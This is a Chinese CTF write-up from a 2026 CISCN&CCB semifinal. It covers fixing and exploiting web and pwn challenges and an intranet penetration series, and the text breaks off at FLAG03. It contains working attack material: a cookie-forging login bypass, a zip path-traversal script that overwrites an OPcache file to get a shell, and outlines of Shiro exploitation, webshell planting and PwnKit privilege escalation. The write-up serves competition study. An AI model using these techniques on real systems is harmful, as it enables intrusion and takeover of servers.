---
title: 【星火之声】第二期：CISCN&amp;CCB半决赛WriteUp
url: https://mp.weixin.qq.com/s/69aC-cpQOLqpoVKNO51KKg
source: Doonsec's feed
date: 2026-03-24
fetch_date: 2026-03-25T04:14:54.204735
---

# 【星火之声】第二期：CISCN&amp;CCB半决赛WriteUp

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/gjGaDARibCgMBLPzKZ8mhhyJw3BvUNVIRQcicKcRtXJQ5EnstnDN3btwrruj1hT80z8wiaQicKDbk3RQUcYeC5plQCotY8JOo58xUgTxnOqyicic8/0?wx_fmt=jpeg)

# 【星火之声】第二期：CISCN&CCB半决赛WriteUp

XJUSEC
XJUSEC

中学生CTF

![]()

在小说阅读器中沉浸阅读

> ❝
>
> 本文来自【星火计划】的【星火之声】投稿，来源于`XJUSEC`2026 年CISCN&CCB半决赛WriteUp。

> ❝
>
> 如果您也想投稿相关文章，可将`Markdown`格式或`Docx`格式文档压缩后投递邮箱`lqn@sierting.com`。

# AWDP

## Web

#### MediaDrive

先从攻击的思路出发的，因为只要会打肯定会fix，文件可以上传，可以读取，可以下载，但是分析源码也知道，ban的特别严格，基本上什么危险文件都上传不上去，文件上传的思路断掉，分析源码看到User类

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPFoZvqcnPznETibxSXuewm2rrt9GQnFq5DQVpNBbyA7o1DnOzKejAPHeDJVfmZqtUIFictUTnzoerOicg20kklmxxTYyMLZGMicyI/640?wx_fmt=png&from=appmsg)

将路径先修改成/etc/，然后?F=passwd 抓包可以读取文件/etc/passwd 最后实在绕不过去，已经到第五轮，然后攻击不了，只能fix了，修起来很简单，直接在preview文件里面禁止用户去别的目录就行了，具体如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPibXLm4tH1MPSicnNy17vybvIzSrw1SGlcEJkIRk6A9LRYwtibho6LOW3dsOiaNpQ6Rdiblbgq0fg9BuorxYP0C5m2SfC2YBl4Z4As/640?wx_fmt=png&from=appmsg)

直接上传，fix成功

#### easy\_time

第一步绕过登录：

再控制台输入，重定向到/dashboard

```
document.cookie = "user=admin; path=/";
document.cookie = "visited=yes; path=/";
location="/dashboard";
```

![](https://mmbiz.qpic.cn/mmbiz_png/gjGaDARibCgPhLTic7ZgYfVTmY0pXvQpR95uyaKP4G1oibTwwTNS8rTL3oV2fS7pA2sPIL5drvZnIGIs0rGgEF4YwiaQa8QSYtIcykC45kl00so/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/gjGaDARibCgPibwdt4K7fd14oXYeU99jxcF6WKbWzFrNQEfcjKKj2f2aVwLtxRBmHw33ObONCAjibCRQxdXg5nF1VOJENH5srvLSCz8jKkajiaE/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPp8M9l8xSZMTOyDw2SOhIEARt8h42YREXVDGJHrzuhGJLVtXRnNltbuLf24RMDhCfqaaOveM8p6Oib1Bia7gb3yiaCJaDQQOIH4U/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/gjGaDARibCgPfGhDaHfmcl5j6rpn8iaCTPavKvUMawGlT8ibM91ztusyJhsMo7lOOnbHgn4amictgiaricwNj7mnWD4ZqC7219gzcDQOFSwVrLGqA/640?wx_fmt=png&from=appmsg)获得时间戳

index.php.bin可以看这篇文章利用PHP的OPcache机制getshell

利用index.php.bin

远程头像 URL：http://127.0.0.1/date.php 远程信息： type=text/html; charset=UTF-8 len=10 len=b'1769426974'

```
timestamp = 1769426974

# 将时间戳转换为小端序字节
little_endian_bytes = timestamp.to_bytes(4, byteorder='little')

# 将字节转换为十六进制字符串并添加空格
hex_string = ' '.join(f'{byte:02x}' for byte in little_endian_bytes)

print(hex_string)

#1e 50 77 69
```

计算opcache的值，这个值是/tmp/hash/var/www/html/的值，是后面覆盖文件时会用到、

phpinfo里面opcache开启了时间验证，index.php.bin还需要改变时间搓`#1e 50 77 69`这个就是我们获得的时间戳转换后的

```
8.2.6 API420220829 NTS  BIN_4888  //版本信息通过phpinfo.php获取

<?php
highlight_file(__FILE__);
echo md5("8.2.6API420220829,NTSBIN_4888(size_t)8\002");
?>

获得md5
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgMW0Teg4T5otmycjpzcV43EYp3VQ39tRSRfD6F8ohO8ymjyUkibwRZzFz5LGybt5w8UdGClQgSfNLvRFwSzxYcq3ZVx9INvmvU8/640?wx_fmt=png&from=appmsg)将文件index.php.bin内容进行修改：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPBB7RJtcFMibT3rYGodUdluVrLdH3KyuicJkOgMiaiaxHSZ4PY2hWRrofeHPZY6vOpZoLOFVj3RQrxa5aMGHruWVKy9MaVcMlg0BU/640?wx_fmt=png&from=appmsg)md5内容修改，同时根据上次获得的时间戳修改文件0040的前4伪。

```
import os
import zipfile
from pathlib import Path
ROOT_PATH = Path(__file__).parent.resolve()
def build_malicious_archive(base_dir: Path, source_file: str, internal_target_path: str, final_archive: str):
    ifnot base_dir.exists():
        base_dir.mkdir(parents=True, exist_ok=True)
    src_blob = base_dir / source_file
    out_package = base_dir / final_archive
    ifnot src_blob.exists():
        print(f"[-] 错误: 找不到源文件 {src_blob}")
        return
    try:
        with zipfile.ZipFile(out_package, 'w', compression=zipfile.ZIP_DEFLATED) as archive:
            archive.write(src_blob, arcname=internal_target_path)
        print(f"[+] 构件生成成功: {out_package}")
        print(f"[+] 注入路径节点: {internal_target_path}")
    except Exception as e:
        print(f"[-] 构建失败: {str(e)}")

SOURCE_BINARY = "index.php.bin"

TRAVERSAL_INJECTION_POINT = (
    "../../../../../../../../../../../../../../../../../tmp/45b8be9467d6ed29438f06cfe9cee9f6"
    "/var/www/html/index.php.bin"
)

CARRIER_PACKAGE = "test.zip"

if __name__ == "__main__":
    build_malicious_archive(
        base_dir=ROOT_PATH,
        source_file=SOURCE_BINARY,
        internal_target_path=TRAVERSAL_INJECTION_POINT,
        final_archive=CARRIER_PACKAGE
    )
```

获得test.zip，上传文件，覆盖index.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPr99hvJcCFwNl0X7sNZeft9UeqvQ1tZ00hibvib9YBiaIvTLI45GeJKgNxAzvias9YYf0EMdgOSFwUnpTZwCgQ06YibrSDmicdr9E1o/640?wx_fmt=png&from=appmsg)

## Pwn

#### catchme

UAF漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPI6wNRXMfdvIPea2bbQPOpCaN9k3H9XPyaSxtsVBd33MH1KNQCwf8iaXFkylITl4V9BIH7uYiaJTAEia9icEdbGf1q0icL9MbIxVUs/640?wx_fmt=png&from=appmsg)定位到这里发现确实存在uaf漏洞

刚开始将free函数nop掉，check服务异常

然后把free函数plt表改为ret，check服务异常

决定写汇编修改，将指针置空

```
.text:0000000000000E05         mov   eax, [rbp+var_14]

.text:0000000000000E08         cdqe

.text:0000000000000E0A         lea   rdx, ds:0[rax*8]

.text:0000000000000E12         lea   rax, qword_202060

.text:0000000000000E19         mov   rax, [rdx+rax]

.text:0000000000000E1D         mov   rdi, rax    ; ptr

.text:0000000000000E20         call  _free

:0000000000000E25         mov   eax, 0
```

这是原来的汇编

我们把mov eax,0nop掉，然后跳转到其他段去修改汇编

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPR9N96g5WAfjx7ybw2EKxo6yAoicOmgQ6JnOk78EDQkBGwoB6ZN33RKO1yxamOjmxIjNATjAuKK3ulTvKz7dRKcznQn01W138Q/640?wx_fmt=png&from=appmsg)这是目标段，先把原来的数据nop掉，然后抄写free函数的汇编

改为如图所示

![](https://mmbiz.qpic.cn/mmbiz_png/gjGaDARibCgPicJYniaDmZTian0NPoJsUDCRqA7U9atVwZZkvAYEeBEKlic0abpctJw7FD4j6XvhJtQdgdmAkf0ibwDxJaKO9ENUINRIPKIhU6CHY/640?wx_fmt=png&from=appmsg)原来的位置进行跳转

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgNVEILHibicrhuliaHmSk0PiampFca4gFnp85mUxhv74PdgeTkAljehURfHNo6Of6Zu3Oe7YypvqYRWz5icH66Xwpib7PSK743Biavbd8/640?wx_fmt=png&from=appmsg)如图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgPBNVvMA9qRSEfhScnAuuGziaDQbchfbrP3XLNZAcmAf4vga4TFZibBkPf4KVt9Hx4m4mOhJU2rVxtuRfKEhQHJzjK8uNWDCvpZA/640?wx_fmt=png&from=appmsg)

Ubuntu运行发现没有段错误，直接打包提交

#### easy\_rw\_revenge

UAF漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgNpl7K1I3sTy2YkhWpADjaFYUbdH6ryQUfMtXCYbQ4R7gJiaPU1Nicke3t4mXevro9ao1qSEqva2yIw1Yw3Na1rVyo17bOWib04hc/640?wx_fmt=png&from=appmsg)发现free之后确实没有置零，根据上一题的经验，继续尝试用汇编修改

同时题目给了delete函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgP0XwxaM3f3UERzcwtB63jsC1kSxBjIf9TkZAl8bONTrOODNY4dicJibGvNHb9kDMB24c8L3f5tyVpXBno565LfTbfmPno7O8BcQ/640?wx_fmt=png&from=appmsg)

这是sub1A00的汇编，尝试将free之后的汇编与这段汇编结合

![](https://mmbiz.qpic.cn/sz_mmbiz_png/gjGaDARibCgMruSEMSibkvft8lbc4bZ48t67mEo0ZicOp6qyFuS22hibPBVlMZqVo3EKYXT109fUsaNmfoNTE6Aia4wOZGPEDsZDy0BqZFqFQibkA/640?wx_fmt=png&from=appmsg)

这是free的汇编

![](https://mmbiz.qpic.cn/mmbiz_png/gjGaDARibCgMNh90YDCHiaeATbGOIs1PicDA3KE2j6zQmBbhgbmOZpiaOLib8Rns7ojJiciaCSr2kCKQN0TVRh5ZaaI0icnN3G8IvIxwQ6C55vHlF5A/640?wx_fmt=png&from=appmsg)改为如图所示

![](https://mmbiz.qpic.cn/mmbiz_png/gjGaDARibCgPMicXREFdaZUktBZJZ6ibn3wic71YVPhW8PlLYmxicvxhwMjy58F3zfgz5koKvP1y2LvbVBwutg4cnj3eukamvFresAn5cPOb4B08/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/gjGaDARibCgPyhVxUfU2WxbibBURyK6InOP8uLfCqxnAXEJdvw0vM5lfWbdAmmTg6jAJOYQyDsMDVNo8HADiblMy8qOOTyWY2TAtewavRp2Aic4/640?wx_fmt=png&from=appmsg)改完之后

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/gjGaDARibCgODI03cYB9s2c8C5wscP6EDljLU699MkgYsDiccqErpfzGkzXmqryiamaIrV1bjXXXd7p7ibZY65icVz7R8oSx6BCIK0WOmMACDyeE/640?wx_fmt=webp&from=appmsg)然后在ubuntu上成功运行

上交后patch通过

# ISW

#### FLAG01

**Fscan扫描**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/gjGaDARibCgMMjdQhtJOv206H7XW9d1zia9Yrkic29whtL5Jyv1a5Vib0C6ZZObeiat6ibmaT0UbObKnAUJLBqxbnnibIM4dXMHC0aFOy1Mic2pYUBE/640?wx_fmt=webp&from=appmsg)检测到漏洞，拿到shirokey，shiro工具

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/gjGaDARibCgMghjBKibJKF5wQxGyEXY4OJ7OFaQx3klA33kI7AUgReptqOfLU9gibabY3XgI2MrXPzJb7EpcJz5w9ss9IhrxKibWhgO3ibDCCFrM/640?wx_fmt=webp&from=appmsg)**先检测密钥然后检测当前利用链子**

**一个个测试发现k1这个链子可以利用成功，拿到flag，然后上个内存马，方便命令执行**

#### FLAG02

**CVE-2021-4034提权（PwnKit）拿到root权限，然后root目录下拿到第二个flag**

#### FLAG03

用vshell搭一个内网隧道，然后将f...